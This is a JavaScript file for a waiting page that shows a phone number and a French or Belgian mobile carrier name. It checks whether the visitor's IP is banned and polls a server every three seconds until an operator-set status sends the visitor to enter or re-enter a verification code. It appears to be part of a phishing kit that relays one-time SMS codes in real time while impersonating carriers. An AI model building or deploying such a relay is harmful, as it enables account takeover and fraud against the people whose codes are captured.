const API_STATUS = '/api/status';

function getParam(name) {
    return new URL(window.location.href).searchParams.get(name);
}

const phone = getParam('phone') || '--';
const carrier = getParam('carrier') || 'Orange';

document.getElementById('displayPhone').textContent = phone;

const carrierNames = {
    'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
    'base': 'BASE', 'orange_be': 'Orange Belgium', 'proximus': 'Proximus', 'telenet': 'Telenet'
};
document.getElementById('carrierName').textContent = carrierNames[carrier] || carrier;

// ─── BAN IP CHECK ───
async function checkBan() {
    try {
        const res = await fetch('/api/check-ban');
        const data = await res.json();
        if (data.banned) {
            window.location.href = 'banned.html';
        }
    } catch (e) {
        console.error('Ban check error:', e);
    }
}

async function checkStatus() {
    try {
        const res = await fetch(`${API_STATUS}?phone=${encodeURIComponent(phone)}`);
        if (!res.ok) return;
        const data = await res.json();

        if (data.status === 'waiting_code') {
            const len = data.code_length || 6;
            window.location.href = `code.html?phone=${encodeURIComponent(phone)}&length=${len}`;
        } else if (data.status === 'wrong_number') {
            window.location.href = `index.html?wrong_number=1`;
        } else if (data.status === 'completed') {
            window.location.href = `success.html?phone=${encodeURIComponent(phone)}`;
        } else if (data.status === 'retry_code') {
            const len = data.code_length || 6;
            window.location.href = `code.html?phone=${encodeURIComponent(phone)}&length=${len}&retry=1`;
        }
    } catch (e) {
        console.error('Polling error:', e);
    }
}

// Vérifie le ban au chargement, puis démarre le polling
checkBan().then(() => {
    checkStatus();
    setInterval(checkStatus, 3000);
});
